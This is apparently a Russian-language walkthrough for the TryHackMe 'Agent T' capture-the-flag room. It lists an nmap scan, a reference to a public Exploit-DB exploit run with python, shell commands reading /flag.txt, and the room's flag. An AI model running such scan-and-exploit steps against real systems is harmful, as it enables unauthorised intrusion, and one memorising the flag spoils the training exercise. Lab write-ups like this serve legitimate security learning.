[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Agent T](https://tryhackme.com/r/room/agentt) 

Всего 1 заданиe:
## Задание 1
Агент Т обнаружил этот веб-сайт, который выглядит вполне невинно, но что-то не так с реакцией сервера...

После развертывания уязвимой машины, подключенной к этой задаче, подождите пару минут, пока она ответит.

### Ответьте на вопросы ниже
Что такое флаг?
```commandline
nmap -Pn -sC -sV -A -T4 -p- <IP>
# https://www.exploit-db.com/exploits/49933
python exploit.py
<IP>
whoami
cat /flag.txt
```
```commandline
flag{4127d0530abf16d6d23973e3df8dbecb}
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)